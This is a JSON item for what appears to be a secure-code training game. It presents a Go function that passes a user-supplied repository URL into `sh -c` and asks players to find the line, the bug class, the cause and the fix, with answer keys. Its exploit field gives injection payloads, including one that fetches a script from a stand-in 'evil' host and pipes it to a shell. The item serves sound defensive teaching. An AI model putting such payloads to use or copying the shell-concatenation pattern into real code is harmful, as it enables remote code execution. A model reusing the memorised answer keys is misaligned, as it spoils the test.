@@ -1,0 +1,109 @@
+{
+  "id": "srd-0034",
+  "date": "2026-10-21",
+  "difficulty": "easy",
+  "language": "go",
+  "estimatedMinutes": 5,
+  "snippet": {
+    "files": [
+      {
+        "name": "git.go",
+        "code": "package main\n\nimport \"os/exec\"\n\n// Clone a repository the user asked for.\nfunc clone(repo string) error {\n\tcmd := exec.Command(\"sh\", \"-c\", \"git clone \"+repo)\n\treturn cmd.Run()\n}",
+        "notes": {
+          "6": "Clones a repository whose URL comes from the user.",
+          "7": "Runs `git clone` via `sh -c`, concatenating `repo` into the shell command string.",
+          "8": "Executes it."
+        }
+      }
+    ]
+  },
+  "stages": {
+    "line": {
+      "file": "git.go",
+      "line": 7,
+      "yellowRadius": 1,
+      "maxGuesses": 5
+    },
+    "bugClass": {
+      "answer": "command-inj",
+      "options": [
+        "command-inj",
+        "code-inj",
+        "ssrf",
+        "sqli",
+        "path-traversal"
+      ]
+    },
+    "why": {
+      "answerIndex": 2,
+      "options": [
+        {
+          "label": "`git clone` is slow for large repos, blocking the handler",
+          "whyWrong": "Latency isn't the issue; the shell interpreting `repo` is."
+        },
+        {
+          "label": "`cmd.Run()` doesn't capture output, hiding errors",
+          "whyWrong": "Output handling is unrelated to the injection."
+        },
+        {
+          "label": "`sh -c` runs a shell and `repo` is concatenated in, so shell metacharacters in it execute as commands"
+        }
+      ]
+    },
+    "fix": {
+      "answerIndex": 1,
+      "options": [
+        {
+          "label": "Wrap repo in quotes in the command",
+          "diff": "-\tcmd := exec.Command(\"sh\", \"-c\", \"git clone \"+repo)\n+\tcmd := exec.Command(\"sh\", \"-c\", \"git clone '\"+repo+\"'\")",
+          "whyWrong": "A quote in `repo` breaks out, and `$()`/backticks still execute inside the shell."
+        },
+        {
+          "label": "Call exec.Command(\"git\", \"clone\", repo) with no shell",
+          "diff": "-\tcmd := exec.Command(\"sh\", \"-c\", \"git clone \"+repo)\n+\tcmd := exec.Command(\"git\", \"clone\", repo)"
+        },
+        {
+          "label": "Remove ';' and '|' from repo",
+          "diff": "+\trepo = strings.NewReplacer(\";\", \"\", \"|\", \"\").Replace(repo)",
+          "whyWrong": "`$()`, backticks, newlines and `&&` still work."
+        },
+        {
+          "label": "Check that repo starts with https://",
+          "diff": "+\tif !strings.HasPrefix(repo, \"https://\") { return errBad }",
+          "whyWrong": "`https://x$(id)` passes a prefix check and still injects via the shell."
+        }
+      ]
+    }
+  },
+  "source": {
+    "origin": "original",
+    "license": "CC0-1.0",
+    "attribution": "SourceReadle original"
+  },
+  "training": {
+    "exploit": "Pass `repo = \"https://x; curl http://evil/s | sh\"` or `repo = \"$(id)\"`. The shell runs `git clone https://x`, then the injected command. Dropping `sh -c` and invoking git directly removes the shell entirely.",
+    "concepts": [
+      "CWE-78",
+      "OWASP A03:2021"
+    ],
+    "hints": {
+      "line": "Which call sends a built string to a shell?",
+      "bugClass": "The input reaches the OS shell.",
+      "why": "Why does `sh -c` make `repo` dangerous?",
+      "fix": "Invoke the binary directly with argument slices."
+    }
+  },
+  "writeup": {
+    "summary": "`exec.Command(\"sh\", \"-c\", \"git clone \"+repo)` runs a shell and concatenates `repo` into the command, so metacharacters execute. Calling `exec.Command(\"git\", \"clone\", repo)` runs git directly with `repo` as a single argument — Go doesn't invoke a shell, so there is nothing to interpret `;`, `$()`, or backticks. Quoting and prefix checks are bypassable.",
+    "readNext": [
+      {
+        "label": "Go os/exec docs",
+        "url": "https://pkg.go.dev/os/exec"
+      },
+      {
+        "label": "OWASP Command Injection",
+        "url": "https://owasp.org/www-community/attacks/Command_Injection"
+      }
+    ]
+  }
+}
